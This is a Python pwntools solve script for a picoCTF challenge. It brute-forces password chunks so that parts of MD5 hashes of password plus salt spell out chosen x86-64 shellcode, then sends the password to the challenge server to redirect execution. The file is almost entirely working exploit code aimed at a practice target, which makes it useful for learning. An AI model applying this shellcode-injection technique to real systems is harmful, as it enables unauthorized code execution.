from pwn import *

# for brute forcing hash
from string import printable
printable = printable[:-6]
from hashlib import md5
from pwnlib.util.iters import mbruteforce

import multiprocessing
multiprocessing.set_start_method('fork')

host = 'mercury.picoctf.net'
port = 17615

elf = ELF('./remote')
context.binary = elf

'''
anti-disassembly pseudocode:
    hash <- md5(password (concatenation) salt)
    run <- hash_(lb...ub)
    goto run
'''

# WRONG couln't find input w/ printable characters to generate corresponding bytes
run = '''
push rdi
movabs rdi, 0x7b3dc26f1
ret
'''
shellcode = asm(run)

# # NOTE get hints -> start of the password to be `D1v1`
run = '''
mov rsi, rdi
movabs rdi, 0x7b3dc26f1
jmp rsi
'''
shellcode = b'H\x89\xfeH\xbf\xf1&\xdc\xb3\x07\x00\x00\x00\xff\xe6'
assert(shellcode == asm(run))

indices = [8, 2, 7, 1]
bytes_indices = [[0 for _ in range(4)] for _ in range(4)]
for j in range(4):
    for k in range(4):
        bytes_indices[k][j] = 16 * k + j + indices[k]
bytes_start = [bytes_indices[i][0] - 0x10 * i for i in range(4)]

salt = 'GpLaMjEWpVOjnnmkRGiledp6Mvcezxls'
password = b''

def brute0(current):
    idx = 0
    content = current + salt[idx * 8: (idx + 1) * 8]
    hash = md5(content.encode()).digest()
    if hash[bytes_start[idx]: bytes_start[idx] + 4] == shellcode[idx * 4: (idx + 1) * 4]:
        return True
    return False

def brute1(current):
    idx = 1
    content = current + salt[idx * 8: (idx + 1) * 8]
    hash = md5(content.encode()).digest()
    if hash[bytes_start[idx]: bytes_start[idx] + 4] == shellcode[idx * 4: (idx + 1) * 4]:
        return True
    return False

def brute2(current):
    idx = 2
    content = current + salt[idx * 8: (idx + 1) * 8]
    hash = md5(content.encode()).digest()
    if hash[bytes_start[idx]: bytes_start[idx] + 4] == shellcode[idx * 4: (idx + 1) * 4]:
        return True
    return False

def brute3(current):
    idx = 3
    content = current + salt[idx * 8: (idx + 1) * 8]
    hash = md5(content.encode()).digest()
    left = len(shellcode) - 12
    if hash[bytes_start[idx]: bytes_start[idx] + left] == shellcode[idx * 4:]:
        return True
    return False


ret = mbruteforce(brute0, printable, method = 'fixed', length = 4, threads = 20)
if (ret == None):
    print ('Valid input not found')
    exit()
password += ret.encode()
ret = mbruteforce(brute1, printable, method = 'fixed', length = 4, threads = 20)
if (ret == None):
    print ('Valid input not found')
    exit()
password += ret.encode()
ret = mbruteforce(brute2, printable, method = 'fixed', length = 4, threads = 20)
if (ret == None):
    print ('Valid input not found')
    exit()
password += ret.encode()
ret = mbruteforce(brute3, printable, method = 'fixed', length = 4, threads = 20)
if (ret == None):
    print ('Valid input not found')
    exit()
password += ret.encode()

def conn():
    return remote(host, port)

def solve(r):
    r.recvuntil(b'Password: ')
    r.sendline(password)
    print (r.recvline()[:-1].decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()
